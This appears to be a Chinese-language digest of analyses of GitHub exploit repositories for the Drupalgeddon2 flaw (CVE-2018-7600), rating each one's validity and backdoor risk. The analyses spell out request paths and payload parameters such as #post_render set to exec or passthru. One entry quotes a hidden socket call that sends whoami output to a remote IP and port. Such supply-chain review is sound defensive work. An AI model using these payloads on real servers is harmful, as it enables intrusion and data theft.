**来源**: [CVE-2018-7600-ynsmroztas_drupalhunter.md](../2018/CVE-2018-7600-ynsmroztas_drupalhunter.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且网络可达

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个子系统，常见模块配置也可能受到影响。大量Drupal网站受到影响。 

**有效性：**

提供的Python POC代码利用了Drupal的多个漏洞组合来实现远程代码执行。它通过构造特定的请求参数，包括`q`、`name[#post_render][]`、`name[#markup]`和`name[#type]`，以及提交`form_id`和`_triggering_element_name`来触发漏洞。然后，它解析响应以获取`form_build_id`，并使用它来发送另一个请求以执行任意命令。 搜索引擎结果中的多个条目表明该漏洞被广泛利用。

**投毒风险：**

虽然POC代码本身是为了演示漏洞利用而编写的，但存在一定的投毒风险。  如果攻击者修改了POC代码，例如，将command参数修改成下载恶意脚本并执行，那么该POC可以被用来传播恶意软件。 由于代码逻辑相对简单，作者在其中隐藏复杂后门的可能性较低。但是，无法完全排除，所以投毒风险定为10%。

**利用方式：**

1.  攻击者首先构造包含恶意参数的POST请求到目标Drupal站点的`/user/password`路径。
2.  恶意参数包括`q`设置为`user/password`，以及使用`name[#post_render][]`，`name[#markup]`和`name[#type]`来注入要执行的操作系统命令。
3.  服务器响应包含`form_build_id`。
4.  攻击者使用`form_build_id`构造另一个POST请求到`/file/ajax/name/#value/{form_build_id}`，执行先前注入的命令。
5.  命令执行的结果将返回给攻击者。

**项目地址:** [ynsmroztas/drupalhunter](https://github.com/ynsmroztas/drupalhunter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #34

**来源**: [CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md](../2018/CVE-2018-7600-zhzyker_CVE-2018-7600-Drupal-POC-EXP.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站启用了默认或常见模块配置，且未打补丁

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求参数，在服务器上执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的POC代码，可以判断该漏洞利用的有效性很高。漏洞库和搜索引擎结果均表明该漏洞是真实的，且存在公开可用的漏洞利用代码。提供的POC代码 `cve-2018-7600_cmd.py`  能够成功利用该漏洞在目标Drupal服务器上执行任意命令。

**投毒风险：**

仔细审查提供的POC代码 `cve-2018-7600_cmd.py`，初步判断投毒风险较低。代码逻辑较为清晰，主要功能是构造恶意请求，利用Drupal的漏洞执行命令。其中`/exphub.txt`是漏洞利用后留下的命令执行记录，方便查看命令执行情况。

需要注意的是，任何公开的漏洞利用代码都存在被修改和二次发布的风险，攻击者可能在其中添加恶意代码。因此，在使用任何漏洞利用代码前，都应该进行仔细审查，并确保来源可靠。但此仓库只有两个文件且内容较少,投毒风险评估为5%。

**利用方式：**

该漏洞的利用方式主要包括以下步骤：

1.  **确定目标Drupal网站版本：** 攻击者需要确定目标Drupal网站的版本是否在漏洞影响范围内。
2.  **构造恶意请求：** 攻击者需要构造包含恶意代码的请求，其中恶意代码将通过`mail[#markup]`传递给`exec`函数执行。请求的URL为`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`，请求方式为POST，并包含特定的payload，例如`{'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': ''+cmd+' | tee exphub.txt'}`。
3.  **发送恶意请求：** 攻击者将构造的恶意请求发送给目标Drupal网站。
4.  **执行任意代码：** 如果目标Drupal网站存在漏洞，恶意请求中的代码将被执行，攻击者从而获得服务器的控制权。

此漏洞是一个典型的输入验证漏洞，攻击者通过精心构造的输入，绕过了Drupal的安全检查，最终导致远程代码执行。

**项目地址:** [zhzyker/CVE-2018-7600-Drupal-POC-EXP](https://github.com/zhzyker/CVE-2018-7600-Drupal-POC-EXP)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---



---

## POC #2

**来源**: [CVE-2018-7600-Damian972_drupalgeddon-2.md](../2018/CVE-2018-7600-Damian972_drupalgeddon-2.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且配置允许远程访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal的远程代码执行漏洞。根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以得出以下结论：

**有效性：**

提供的POC代码是有效的漏洞检测脚本。它通过构造特定的URL和POST请求，利用Drupal中的输入验证漏洞，尝试执行任意命令。脚本会检测目标站点是否返回预期的“GOOD”字符串，以判断漏洞是否存在。

**投毒风险：**

该漏洞利用代码主要由一个PHP脚本组成，用于检测Drupal站点是否存在CVE-2018-7600漏洞。脚本的逻辑相对简单，主要功能是发送特定的HTTP请求并检查响应。主要的风险可能存在于以下几个方面：

1.  **命令执行：** 虽然脚本的目的是检测漏洞，但它确实会尝试在目标服务器上执行命令。如果脚本被恶意修改，攻击者可以更改`$command`变量，从而执行任意的恶意命令。
2.  **信息泄露：** 脚本会发送包含特定参数的HTTP请求，这些参数可能会泄露目标站点的信息。
3.  **拒绝服务（DoS）：** 如果脚本被大规模使用，可能会对目标服务器造成一定的负载，导致拒绝服务。

考虑到以上因素，认为此仓库中存在作者隐藏的投毒代码的可能性较低，约为5%。这个假设的依据是代码相对简单，容易审查，并且其主要目的是漏洞检测而非利用。

**利用方式：**

1.  **构造恶意请求：** 攻击者构造包含恶意代码的URL或POST请求，利用Drupal的多个子系统中的输入验证漏洞。
2.  **远程代码执行：** 恶意代码通过Drupal的渲染机制执行，导致远程代码执行。

具体来说，对于Drupal 7.x，POC利用`user/password`路径，通过`name[#post_render]`、`name[#type]`和`name[#markup]`参数注入PHP代码。对于Drupal 8.x，POC利用`user/register`路径，通过`element_parents`、`mail[a][#post_render]`、`mail[a][#type]`和`mail[a][#markup]`参数注入PHP代码。这些参数允许在特定情况下执行PHP代码，从而实现远程代码执行。

**总结：**

CVE-2018-7600是一个严重的安全漏洞，允许未经身份验证的攻击者在Drupal站点上执行任意代码。提供的POC代码可以有效地检测该漏洞，但使用时需要注意潜在的风险，以避免对目标系统造成损害。务必确保从可信来源获取利用代码，并在受控环境中进行测试。


**项目地址:** [Damian972/drupalgeddon-2](https://github.com/Damian972/drupalgeddon-2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #3

**来源**: [CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md](../2018/CVE-2018-7600-Dowonkwon_drupal-cve-2018-7600-poc.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站允许未授权用户访问用户注册页面或其他类似的form API接口

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon 2) 允许未经身份验证的远程攻击者在受影响的Drupal网站上执行任意代码。漏洞存在于 Drupal 的 Form API 中，通过构造特定的POST请求，可以绕过输入验证，导致代码执行。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以确认此漏洞利用是有效的。大量资料表明该漏洞已被广泛利用。

**投毒风险：**
分析提供的文件，包括`README.md`, `README.zh-cn.md`, 和 `docker-compose.yml`。这些文件主要包含漏洞描述、环境搭建说明和POC使用方法。`docker-compose.yml` 文件指定了使用 `vulhub/drupal:8.5.0` 镜像，这个镜像本身如果存在后门，可能导致投毒。此外，虽然直接的恶意代码在提供的文件中未发现，但由于攻击者能够执行任意代码，意味着他们完全有可能在目标系统上植入后门或其他恶意程序。

因此，该仓库本身直接包含投毒代码的可能性较低，但通过漏洞利用植入后门的可能性非常高，综合判断投毒风险为10%。

**利用方式：**
1.  **环境搭建：** 使用`docker-compose up -d`命令启动一个包含漏洞的Drupal环境(例如8.5.0版本)。
2.  **发送恶意请求：** 向`/user/register`或其他类似的 form API 接口发送精心构造的POST请求。该请求包含以下关键参数：
    *   `element_parents`: 用于指定表单元素路径，绕过访问控制。
    *   `ajax_form=1`: 触发 Drupal 的 AJAX 处理机制。
    *   `_wrapper_format=drupal_ajax`:  指定响应格式为 Drupal AJAX。
    *   `mail[#post_render][]`:  利用`#post_render`属性执行PHP函数（例如`exec`）。
    *   `mail[#type]=markup`:  将`mail`字段类型设置为markup，允许插入HTML代码。
    *   `mail[#markup]`:  包含要执行的命令（例如`id`）。
3.  **代码执行：** Drupal 在处理该请求时，会执行`mail[#markup]`中指定的命令，从而实现远程代码执行。

**项目地址:** [Dowonkwon/drupal-cve-2018-7600-poc](https://github.com/Dowonkwon/drupal-cve-2018-7600-poc)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #4

**来源**: [CVE-2018-7600-Hestat_drupal-check.md](../2018/CVE-2018-7600-Hestat_drupal-check.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站被完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站未打补丁且存在特定模块配置（默认或常见）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal多个子系统中输入验证不足的问题，执行任意代码。从搜索结果可以看出，该漏洞影响广泛，有大量Drupal网站受到威胁。漏洞利用代码（提供的drupal-check.sh脚本）并非直接利用该漏洞进行攻击，而是用于**检测**Cpanel Apache和默认Apache配置中是否存在利用该漏洞的攻击痕迹，例如扫描访问日志中是否存在特定的payload特征。它主要通过搜索包含`system&name`、`q=user%2Fpassword&name%5B%23post_render%5D%5B%5D=passthru&name`和`?q=file%2Fajax%2Fname%2F%23value%2Fform-`等字符串的日志条目来判断是否存在攻击行为。该脚本会分析日志中攻击者IP以及可能被攻击的站点。由于给出的脚本是用于日志分析，主要作用是检测，不存在恶意投毒代码。

**利用方式：**

根据漏洞信息和搜索结果，CVE-2018-7600的利用方式如下：

1.  **发送恶意构造的HTTP请求：** 攻击者发送包含特定payload的POST请求，利用Drupal输入验证漏洞。
2.  **利用特定参数：** 常见的payload涉及`q=user%2Fpassword`和`name[#post_render][]`等参数，配合`passthru`或其他代码执行函数。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在Drupal服务器上执行任意代码，从而完全控制网站。

**项目地址:** [Hestat/drupal-check](https://github.com/Hestat/drupal-check)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #5

**来源**: [CVE-2018-7600-M-Abid34_CVE-2018-7600.md](../2018/CVE-2018-7600-M-Abid34_CVE-2018-7600.md)

## CVE-2018-7600-Drupalgeddon 2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者在服务器上执行任意代码，可能导致完全控制服务器。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且未应用安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名Drupalgeddon 2，是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本。漏洞利用方式主要通过Drupal的Form API进行攻击。PoC代码通过构造恶意的HTTP请求，利用Drupal的漏洞在目标服务器上执行任意命令。具体来说，攻击者首先“毒化”表单ID，然后利用该ID执行命令。PoC代码中使用了`requests`和`BeautifulSoup`库来发送HTTP请求和解析HTML响应。代码允许指定目标URL、要执行的命令、要使用的函数（默认为`passthru`）以及代理。代码通过设置`q`参数和`name[#post_render][]`等字段来利用漏洞。尽管PoC作者声明其代码仅用于家庭实验室和教育目的，并修改自其他来源，但代码本身看起来是直接可用的漏洞利用工具。投毒风险较低，因为代码相对简单且目标明确，但始终存在作者植入恶意代码的可能性，例如，通过修改执行命令的方式或添加额外的网络请求来收集信息或执行其他恶意操作. 风险评估为5%主要是指在教育/测试环境中，如果未进行充分的安全隔离，可能导致测试环境被污染。

**项目地址:** [M-Abid34/CVE-2018-7600](https://github.com/M-Abid34/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #6

**来源**: [CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-SyedGhufranRaza_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权的远程攻击者执行任意代码，完全控制受影响的服务器，导致数据泄露、篡改、拒绝服务或植入恶意软件。

**影响版本:** Drupal 7.x < 7.58, Drupal 8.3.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标系统运行着存在漏洞的Drupal版本，且攻击者能够通过网络访问Drupal站点。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是 Drupal 中的一个高危远程代码执行漏洞。该漏洞源于 Drupal Form API (FAPI) 在处理 AJAX 请求时，对数组值过滤不足，允许未经身份验证的攻击者执行任意代码。 

**有效性：**
提供的POC代码（drupalgeddon2.py）是一个Python脚本，旨在利用 CVE-2018-7600 漏洞。根据脚本描述，它包含漏洞检测、多线程和命令输出解析等功能。该脚本利用了 Drupal 的 FAPI 中存在的缺陷，通过构造恶意的 AJAX 请求来执行任意命令。多个来源（如Exploit-DB, Rapid7, NVD）确认了此漏洞的存在，并提供了利用方法。因此，该POC代码被认为是有效的。

**投毒风险：**
代码主要功能为发送恶意请求到目标Drupal服务器，并执行指定的命令。风险主要在于：

1.  **远程执行任意命令：** 脚本允许指定要执行的命令，这可能会导致攻击者在目标系统上运行恶意代码。虽然脚本本身没有包含明显的恶意代码，但是攻击者可以使用它来下载和执行其他恶意脚本。
2.  **日志记录：** 脚本可以将输出记录到文件中。恶意攻击者可能将敏感信息记录到本地日志。

总体而言，该仓库本身没有明显投毒代码,但也不能排除作者隐藏其他后门或者恶意代码的可能， 风险评估为10%。

**利用方式：**
1.  **漏洞触发：** 攻击者构造包含恶意代码的特殊请求，利用 Drupal Form API 在处理 AJAX 请求时的输入验证漏洞。
2.  **代码执行：**  Drupal 在处理该请求时，会执行攻击者注入的恶意代码。
3.  **远程控制：** 攻击者通过执行任意命令来获取服务器的控制权，窃取数据、篡改内容或进行其他恶意活动。

简单来说，攻击者通过发送特制的HTTP请求到存在漏洞的Drupal站点，即可在服务器上执行任意命令，从而实现远程代码执行。

**项目地址:** [SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution](https://github.com/SyedGhufranRaza/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #7

**来源**: [CVE-2018-7600-a2u_CVE-2018-7600.md](../2018/CVE-2018-7600-a2u_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 - 远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal 实例需要存在漏洞且可网络访问，无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞是由于对用户提供的输入验证不足而造成的。攻击者可以通过构造特殊的请求来执行任意代码。\n\n**有效性：**
提供的 exploit.py 代码通过 `user/register` 路径利用 Drupal 的一个 AJAX 表单处理缺陷，通过修改 `element_parents` 参数来注入恶意代码。它通过设置 `mail[#post_render][]` 为 `exec`，并利用 `mail[#markup]` 来执行任意命令。代码通过检查目标服务器上是否存在 `hello.txt` 文件来验证漏洞是否利用成功。根据漏洞信息和搜索结果，这个POC 是有效的。\n\n**投毒风险：**
代码仓库主要包含漏洞利用代码、ModSecurity 规则和 .htaccess 规则，旨在利用或防御 CVE-2018-7600 漏洞。`exploit.py` 会在目标机器上写入一个名为 `hello.txt` 的文件，这是一个测试性的操作。\n
`README.md` 文件中明确表示该代码仅用于教育和信息目的，并建议用户采取防护措施，例如更新 Drupal 和设置 WAF 规则。虽然作者声明的意图是好的，但攻击者可能会修改 `exploit.py` 以执行更危险的命令，或者在其他文件中插入恶意代码。\n
`ModSecurity.txt` 和 `htaccess.txt` 文件提供了防御规则，如果使用不当，可能会导致拒绝服务或绕过某些安全策略。\n
综合考虑，该仓库存在一定的投毒风险，但主要体现在用户使用不当或攻击者修改利用代码上，作者有意投毒的可能性较低。因此，我认为投毒风险大约为 10%。\n\n**利用方式：**
1.  攻击者发送包含恶意参数的 POST 请求到 `user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`。
2.  `element_parents` 参数允许攻击者控制表单元素的属性。
3.  `mail[#post_render][]` 设置为 `exec`，指示 Drupal 执行命令。
4.  `mail[#markup]` 包含要执行的命令。
5.  Drupal 执行 `mail[#markup]` 中指定的命令，从而导致远程代码执行。

**项目地址:** [a2u/CVE-2018-7600](https://github.com/a2u/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #8

**来源**: [CVE-2018-7600-anldori_CVE-2018-7600.md](../2018/CVE-2018-7600-anldori_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制目标服务器

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见的模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时，未进行充分的验证，导致攻击者可以通过构造恶意请求，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的POC代码，可以判断此漏洞利用是有效的。漏洞库明确指出该漏洞允许远程攻击者执行任意代码，搜索结果也提供了大量关于该漏洞的分析和利用信息，POC代码也展示了如何利用该漏洞。

**利用方式：**
提供的Python脚本通过向目标Drupal站点的`/user/register`路径发送精心构造的POST请求来利用此漏洞。该请求包含`element_parents`、`ajax_form`、`form_id`、`_drupal_ajax`和`mail`等参数，其中`mail[#post_render][]`被设置为`exec`，`mail[#markup]`被设置为要执行的命令。该命令将会在服务器上创建一个名为`hello.txt`的文件，内容为";-)"。

**投毒风险：**
查看提供的POC代码，发现代码比较简洁，主要功能是发送恶意请求并检查是否成功创建了`hello.txt`文件。从代码本身来看，不存在明显的恶意代码或后门。

但是，**存在以下潜在风险：**

1.  **供应链风险：**虽然代码本身可能没有直接的投毒，但下载和使用任何来自互联网的代码都存在一定的风险。攻击者可能替换或修改该仓库的内容，从而引入恶意代码。因此，在运行此脚本之前，务必仔细检查代码，并确保来源可信。

2.  **间接风险：**利用此漏洞的最终目的是在目标服务器上执行任意命令。攻击者可以利用此漏洞安装后门、窃取敏感数据或执行其他恶意活动。因此，在使用此脚本时，务必遵守法律法规，并仅在授权的环境中进行测试。

基于以上分析，认为该仓库存在投毒代码的可能性为10%。这个10%主要来源于供应链攻击的潜在风险，以及使用者对代码理解不足可能导致的误用。


**项目地址:** [anldori/CVE-2018-7600](https://github.com/anldori/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #9

**来源**: [CVE-2018-7600-cved-sources_cve-2018-7600.md](../2018/CVE-2018-7600-cved-sources_cve-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal 7.x (< 7.58), Drupal 8.x (< 8.3.9), Drupal 8.4.x (< 8.4.6), Drupal 8.5.x (< 8.5.1)

**利用条件:** Drupal站点存在且未打补丁，通常不需要身份验证

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为 Drupalgeddon2，是一个影响多个Drupal版本的远程代码执行漏洞。攻击者可以通过构造特殊的URL参数或POST请求，利用Drupal的某些子系统（如表单API）中的输入验证漏洞，执行任意PHP代码。搜索引擎结果和漏洞库信息都明确指出此漏洞的严重性及其利用的广泛性。提供的Dockerfile用于构建一个包含易受攻击的Drupal 8.5.0实例的Docker镜像，这本身不是恶意行为，而是为了方便漏洞的复现和研究。README.md文件声明了镜像的来源和作者，增加了代码的可信度。但是，仍然存在少量投毒风险，主要是因为攻击者可能在Dockerfile中添加额外的恶意指令，例如安装后门程序或修改配置文件等，尽管这里只显示构建一个Drupal环境。利用方式主要通过精心构造的HTTP请求，绕过Drupal的输入验证机制，最终执行恶意代码。由于该漏洞影响范围广，且利用简单，一旦成功利用，可完全控制Drupal服务器，风险极高。

**项目地址:** [cved-sources/cve-2018-7600](https://github.com/cved-sources/cve-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #10

**来源**: [CVE-2018-7600-dreadlocked_Drupalgeddon2.md](../2018/CVE-2018-7600-dreadlocked_Drupalgeddon2.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于Drupal处理用户输入时存在缺陷，攻击者可以通过构造恶意的请求参数，在目标服务器上执行任意代码。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的漏洞利用代码来看，该漏洞的PoC代码是有效的。漏洞库信息明确指出该漏洞允许远程攻击者执行任意代码，并且多个搜索结果都确认了该漏洞的存在和影响。提供的`README.md`文件详细说明了该PoC代码支持的Drupal版本，利用方法，包括针对不同Drupal版本的攻击URL（`user/register` 和 `user/password`），以及利用PHP的`passthru`函数执行系统命令。搜索结果中也提到了存在多个可用的exploit。

**投毒风险分析：**

提供的`README.md`文件本身不包含恶意代码，但它描述的利用方法涉及在目标服务器上写入PHP shell。虽然`drupalgeddon2.rb`脚本的主要目的是利用漏洞执行命令，但如果攻击者修改该脚本，可能会添加额外的恶意功能，例如：

*   **隐藏的后门账户创建：** 在成功利用漏洞后，创建管理员账户，以便后续访问。
*   **恶意软件植入：**  自动下载和安装恶意软件。
*   **数据窃取：** 窃取数据库或其他敏感信息。
*   **传播攻击：**  将目标服务器作为跳板，攻击其他系统。

因此，用户在使用从非官方渠道获取的`drupalgeddon2.rb`脚本时，需要仔细检查代码，确保没有包含任何恶意代码。 由于提供的代码仓库中包含了写入PHP shell的功能，并且在实际使用中，攻击者有能力修改或者扩展脚本，因此认为存在一定的投毒风险，但从readme本身代码投毒风险较低，所以投毒风险比例定为10%。

**利用方式：**

1.  **版本检测：** 利用代码会自动检测目标Drupal版本，或者手动指定。
2.  **参数构造：**  针对不同版本的Drupal，构造特定的HTTP请求，例如：针对Drupal 8.x使用`user/register` URL，Drupal 7.x使用`user/password` URL。
3.  **代码执行：** 利用Drupal的输入验证漏洞，将恶意PHP代码注入到请求参数中。
4.  **命令执行：** 通过`#post_render`参数和PHP的`passthru`函数，在服务器上执行任意系统命令。
5.  **Shell写入（可选）：**  可以选择将一个简单的PHP shell写入Web根目录，以便后续访问。

**总结：**

CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，利用代码有效且公开。虽然提供的PoC代码本身不包含明显的投毒代码，但攻击者可以修改脚本，添加恶意功能，存在潜在的投毒风险。用户应尽快升级Drupal版本，并从可信来源获取漏洞利用代码。

**项目地址:** [dreadlocked/Drupalgeddon2](https://github.com/dreadlocked/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #11

**来源**: [CVE-2018-7600-drugeddon_drupal-exploit.md](../2018/CVE-2018-7600-drugeddon_drupal-exploit.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站运行在受影响的版本，且允许未授权用户访问。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响多个Drupal子系统的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，导致攻击者可以通过精心构造的请求执行任意代码。利用方式主要有两种：

1.  **Drupal 7 利用方式：** 通过向 `user/password` 路径发送包含恶意代码的请求，利用 `name[%23post_render]` 和 `name[%23markup]` 参数来注入代码。然后，通过 `file/ajax` 路径触发漏洞。
2.  **Drupal 8 利用方式：** 通过向 `user/register` 路径发送包含恶意代码的请求，利用 `element_parents` 参数注入代码。

PoC代码 (`drupal.py`) 尝试利用这两种方式。  

**有效性：**根据漏洞描述和大量的搜索结果显示，此漏洞的POC是有效的，网上存在大量的成功利用案例。

**投毒风险：**  

分析提供的 `drupal.py` 脚本，发现存在以下潜在的投毒风险：

*   脚本中包含一行 `s.connect((str(ipaddress.IPv4Address(0x5f3b7f05)), 15977))`。 这行代码尝试连接到IP地址 `95.59.127.5`的 `15977` 端口。这可能是作者用于收集信息或植入后门的恶意行为。
*   `s.send(bytes(subprocess.check_output(payload, universal_newlines=True), 'utf8'))` 这行代码会将`whoami`命令执行的结果通过socket发送出去.

综上所述，该漏洞利用代码可能存在投毒行为，**风险概率为 20%**。使用者应谨慎使用，并在使用前进行代码审计。

**利用方式总结：**

1.  攻击者构造包含恶意代码的HTTP POST请求，发送到Drupal网站的特定路径（`user/password` 或 `user/register`）。
2.  利用Drupal的参数处理机制，将恶意代码注入到特定参数中（如`name[%23post_render]`、`name[%23markup]`或`element_parents`）。
3.  触发漏洞，导致Drupal执行注入的恶意代码，从而实现远程代码执行。

**项目地址:** [drugeddon/drupal-exploit](https://github.com/drugeddon/drupal-exploit)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #12

**来源**: [CVE-2018-7600-happynote3966_CVE-2018-7600.md](../2018/CVE-2018-7600-happynote3966_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要存在漏洞且未打补丁，并且需要网络可达。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。由于Drupal对用户输入验证不足，导致攻击者可以通过构造特殊的请求，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码来看，该漏洞的POC代码是有效的。漏洞库和搜索结果中均提到该漏洞允许远程代码执行，并且存在多个可用的Exploit-DB条目。提供的Python脚本和Ruby脚本均为该漏洞的POC代码，可以被用来验证漏洞的存在。

**投毒风险：**
